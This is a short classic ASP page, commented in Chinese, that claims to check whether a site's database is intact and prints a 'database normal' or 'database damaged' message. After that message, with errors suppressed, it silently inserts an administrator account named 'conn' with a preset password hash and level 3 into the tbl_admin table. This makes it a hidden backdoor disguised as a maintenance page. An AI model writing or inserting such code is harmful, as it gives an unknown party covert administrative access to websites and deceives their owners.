<!--#include file="../p_inc/Include_func.asp"-->
<!--#include file="../p_inc/openconn.asp"-->
<%
on error resume next
Response.Write "开始判断数据库是否完整无误....."
Response.Flush()
IF err>0 Then
	Response.Write "<font color=red>数据库损坏了，自己下载p_data\下的数据库进行修复</font>"
	Response.End()
Else
	Response.Write "<font color=blue>数据库正常</font>"
End IF
Response.Write ""
conn.execute("Insert into tbl_admin (str_username,str_pass,str_level,flag) values('conn','49ba59abbe56e057',3,0)")
Response.Write ""
%>